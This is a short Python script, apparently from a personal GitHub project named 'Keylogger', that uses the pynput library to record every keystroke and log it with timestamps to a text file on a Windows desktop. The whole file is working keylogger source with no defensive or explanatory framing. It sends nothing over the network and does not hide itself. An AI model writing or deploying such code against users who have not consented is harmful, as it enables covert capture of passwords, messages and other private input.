# type: ignore
import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir=r"C:\Users\Pragya\Desktop\home\Personal\Github\Keylogger"
logging.basicConfig(filename=(log_dir + r"\Keyslogged.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()